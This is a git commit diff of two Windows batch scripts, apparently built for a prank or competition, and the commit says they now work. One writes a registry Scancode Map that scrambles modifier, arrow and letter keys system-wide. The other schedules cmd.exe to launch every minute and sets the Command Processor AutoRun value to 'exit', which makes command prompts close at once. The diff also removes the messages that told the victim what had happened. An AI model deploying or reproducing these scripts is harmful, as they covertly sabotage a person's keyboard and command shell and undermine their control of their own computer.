3e9460e6f681b467bc9cdd4b82b9cf04a4f02330
12pounce89 <astorrs27@gmail.com>
2025-04-28 13:33:21 -0400

    improvements for consistency and accuracy -- should all be working now

--- executables/competition_changes.bat
+++ executables/competition_changes.bat
@@ -1,15 +1,8 @@
 @echo off
-setlocal
+:: Requires admin privileges
 
-:: Target registry key
-set "KEY=HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout"
+:: shift -> ctrl -> alt -> shift, invert arrow keys, C -> D -> M -> C
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d ^
+00000000000000000B0000001D002A0038001D002A0038004BE04DE04DE04BE050E048E048E050E02E0032003200200020002E0000000000 /f
 
-:: Compose the binary value:
-:: Header (8 bytes) + Count (4 bytes) + 10 remaps (40 bytes) + Null terminator (4 bytes)
-:: Count: 0B 00 00 00 = 11 (10 remaps + null)
-
-reg add "%KEY%" /v "Scancode Map" /t REG_BINARY /d 00000000000000000B0000002A001D001D00380038002A004BE04DE04B004DE050E048E048E050E032002E00200032002E00200000000000 /f
-
-echo Keys remapped in registry.
-echo Please restart your computer for the changes to take effect.
-pause
+exit
--- executables/schedule_task.bat
+++ executables/schedule_task.bat
@@ -1,19 +1,13 @@
 @echo off
-setlocal
+:: Does not need administrator
 
-:: Set variables
-set "DOCS=%USERPROFILE%\Documents"
-set "TEXT_FILE=%DOCS%\prank.txt"
 set "TASK_NAME=GetPranked"
-
-:: Create the prank file
-echo You've been pranked > "%TEXT_FILE%"
 
 :: Schedule task to run cmd.exe every minute
 schtasks /create /tn "%TASK_NAME%" /tr "cmd.exe" /sc MINUTE /mo 1 /f
-
-:: Optionally run the task immediately
 schtasks /run /tn "%TASK_NAME%"
 
-echo Scheduled task created and executed.
-pause
+:: Install my autorun
+reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "exit" /f
+
+exit
